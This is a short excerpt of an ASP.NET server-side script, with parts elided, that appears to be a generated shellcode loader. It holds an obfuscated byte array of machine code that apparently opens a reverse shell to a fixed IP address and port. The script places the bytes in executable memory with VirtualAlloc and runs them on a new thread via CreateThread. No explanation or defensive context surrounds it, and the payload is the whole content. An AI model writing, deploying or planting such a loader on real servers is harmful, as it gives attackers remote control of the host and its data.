...
<script runat="server">
    ...
    {
        byte[] kLwtkeRW3AF4 = new byte[460] {
...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x09,0xb4,0x28,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr hMQ = VirtualAlloc(IntPtr.Zero,(UIntPtr)kLwtkeRW3AF4.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kLwtkeRW3AF4,0,hMQ,kLwtkeRW3AF4.Length);
        IntPtr nSq_vem_AjU = IntPtr.Zero;
        IntPtr nc29ckHTBFj = CreateThread(IntPtr.Zero,UIntPtr.Zero,hMQ,IntPtr.Zero,0,ref nSq_vem_AjU);
    }
</script>
